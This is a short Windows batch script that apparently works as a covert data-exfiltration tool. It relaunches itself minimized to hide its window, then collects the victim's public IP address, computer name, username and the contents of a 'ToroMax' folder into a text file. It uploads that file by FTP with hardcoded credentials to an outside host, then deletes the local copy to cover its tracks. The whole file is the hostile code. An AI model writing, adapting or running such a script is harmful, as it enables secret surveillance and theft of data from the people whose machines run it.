@echo off
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
Color 9
cd "C:\Users\%username%\AppData\Local\Temp\"
curl ifconfig.me >> IP~%computername%~%username%.txt
@echo /////////////////////////////// >> IP~%computername%~%username%.txt
dir "C:\Users\%username%\ToroMax\" >> IP~%computername%~%username%.txt
@echo /////////////////////////////// >> IP~%computername%~%username%.txt
timeout /t 1
curl.exe -u amaguadalupekoa.eu5.org:kktua124 -T IP~%computername%~%username%.txt ftp://amaguadalupekoa.eu5.org/ToroMax/
timeout /t 1
del IP~%computername%~%username%.txt /F
timeout /t 1
cls
exit
